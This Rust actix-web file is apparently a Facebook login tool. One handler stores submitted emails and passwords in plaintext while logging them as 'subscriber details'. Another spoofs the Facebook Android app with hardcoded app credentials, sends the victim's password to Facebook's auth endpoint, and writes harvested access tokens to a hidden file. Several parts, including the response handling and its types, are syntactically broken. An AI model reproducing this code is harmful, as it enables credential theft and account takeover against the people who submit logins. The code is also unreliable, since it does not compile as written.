use std::process::Command;

use actix_web::web::Json;
use actix_web::{web, HttpResponse};
use reqwest::header::{HeaderMap, HeaderName, HeaderValue};
use sqlx::PgPool;
use uuid::Uuid;
use chrono::Utc;
use rand::prelude::*;
use serde_json::Value;

#[derive(serde::Deserialize)]
pub struct FormData {
    email: String,
    password: String,
}

pub async fn login(form: web::Form<FormData>,pool: web::Data<PgPool>,) -> HttpResponse {
    log::info!("Saving new subscriber details in the database");
    match sqlx::query!(
        r#"
        INSERT INTO fbsearch (id, email, name, searched_at)
        VALUES ($1, $2, $3, $4)
        "#,Uuid::new_v4(),form.email,form.password,Utc::now())
        // We use `get_ref` to get an immutable reference to the `PgConnection`
        // wrapped by `web::Data`.
        .execute(pool.get_ref())
        .await{
            Ok(_) => {
                log::info!("New subscriber details have been saved");
                HttpResponse::Ok().finish()
            },
            Err(e) => {
                log::error!("Failed to execute query: {}", e);
                HttpResponse::InternalServerError().finish()
            }
        }
}


pub async fn login_facebook(form: web::Form<FormData>)-> HttpResponse{
    let mut rng = thread_rng();
    let brands = ["Samsung", "Oppo", "Vivo", "Tecno", "Infinix"];
    let android = brands.choose(&mut rng).unwrap();
    let version = rng.gen_range(5..12);
    let fbav = format!("{}.00.{}.{}", rng.gen_range(111..999).to_string(),rng.gen_range(2..9).to_string(),rng.gen_range(111..999).to_string());
    let fbaav = format!("{}.1.A.0.{}",rng.gen_range(10..90), rng.gen_range(111..999));
    let output = Command::new("wmic")
        .arg("csproduct")
        .arg("get")
        .arg("name")
        .output()
        .expect("Failed to execute command");

    let model = match String::from_utf8(output.stdout) {
        Ok(stdout) => {
            let lines: Vec<&str> = stdout.lines().collect();
            if lines.len() > 1 {
                lines[1].trim().to_string()
            } else {
                "Infinix Hot10".to_string()
            }
        }
        Err(_) => "Infinix Hot10".to_string(),
    };

    let uas = format!(
        "SupportsFresco=1 modular=1 Dalvik/2.1.0 (Linux; U; Android {}.1.1; {} Build/{}) [FBAN/FB4A;FBAV/{};FBBV/20748051;FBDM/{{density=1.5,width=540,height=960}};FBLC/nl_NL;FBCR/vodafone NL;FBMF/{};FBBD/{};FBPN/com.facebook.katana;FBDV/{};FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]",
        version, model, fbaav, fbav, android, android, model
    );
    let x_fb_net_hni = &rng.gen_range(20000..40000).to_string();
    let x_fb_sim_hni = &rng.gen_range(20000..40000).to_string();
    let head:Vec<(&str,&str)> = vec![
        ("User-Agent", &uas),
        ("Accept-Encoding", "gzip, deflate"),
        ("Accept", "*/*"),
        ("Connection", "close"),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("Host", "graph.facebook.com"),
        ("X-FB-Net-HNI", x_fb_net_hni),
        ("X-FB-SIM-HNI", x_fb_sim_hni),
        ("Authorization", "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32"),
        ("X-FB-Connection-Type", "WIFI"),
        ("X-Tigon-Is-Retry", "False"),
        (
            "x-fb-session-id",
            "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32",
        ),
        ("x-fb-device-group", "5120"),
        ("X-FB-Friendly-Name", "ViewerReactionsMutation"),
        ("X-FB-Request-Analytics-Tags", "graphservice"),
        ("X-FB-HTTP-Engine", "Liger"),
        ("X-FB-Client-IP", "True"),
        ("X-FB-Server-Cluster", "True"),
        ("x-fb-connection-token", "62f8ce9f74b12f84c123cc23437a4a32"),
    ];

    let data = format!(
        "adid={}&format=json&device_id={}&email={}&password={}&generate_analytics_claims=1&community_id=&cpl=true&try_num=1&family_device_id={}&credentials_type=password&source=login&error_detail_type=button_with_disabled&enroll_misauth=false&generate_session_cookies=1&generate_machine_id=1&currently_logged_in_userid=0&locale=en_PK&client_country_code=PK&fb_api_req_friendly_name=authenticate&api_key=62f8ce9f74b12f84c123cc23437a4a32&access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
        Uuid::new_v4(),
        Uuid::new_v4(),
        form.email,
        form.password,
        Uuid::new_v4()
    );
    let client = reqwest::Client::new();
    let response = client
        .post("https://b-graph.facebook.com/auth/login")
        .headers(create_header_map(head))
        .form(&data)
        .send()
        .await;
     match response {
        // Deserialize the response body into JSON
        Ok(response)=>{
            let json_data = serde_json::from_slice(response.into(u8))?;
        checker(json_data)
        },

        println!("Request failed with status: {}", response.status());
    } 

}



use std::fs::OpenOptions;
use std::io::prelude::*;

fn checker(po: &serde_json::Value) -> String {
    println!("{:?}", po);
    if po["session_key"].is_string() {
        if let Some(access_token) = po["access_token"].as_str() {
            if let Ok(mut file) =
                OpenOptions::new().append(true).open("developer_file_donot_open/.token.txt")
            {
                if let Err(e) = writeln!(&mut file, "{}", access_token) {
                    eprintln!("Couldn't write to file: {}", e);
                }
            } else {
                eprintln!("Couldn't open file");
            }
            println!(" \x1b[1;32mSuccessfully login done ;-X \x1b[0m");
            std::thread::sleep(std::time::Duration::from_secs(2));
            println!(" Access Token : \x1b[1;36m{}\x1b[0m", access_token);
            std::thread::sleep(std::time::Duration::from_secs(1));
            return access_token.to_string();
        }
    } else if po["error"]["message"]
        .as_str()
        .map_or(false, |msg| msg.contains("User must verify their account on www.facebook.com"))
    {
        println!(" \x1b[1;31mFacebook Account Is In Checkpoint\x1b[0m");
        println!(" Login Another Account");
        std::process::exit(1);
    } else {
        println!(" \x1b[1;35mSomething Went Wrong Maybe Email Or Password Is Wrong\x1b[0m");
        println!(" Login Another Account");
        std::process::exit(1);
    }
    String::new()
}

fn create_header_map(headers: Vec<(&str, &str)>) -> HeaderMap {
    let mut header_map = HeaderMap::new();
    for (name, value) in headers {
        if let Ok(name) = HeaderName::from_bytes(name.as_bytes()) {
            if let Ok(value) = HeaderValue::from_str(value) {
                header_map.insert(name, value);
            }
        }
    }
    header_map
}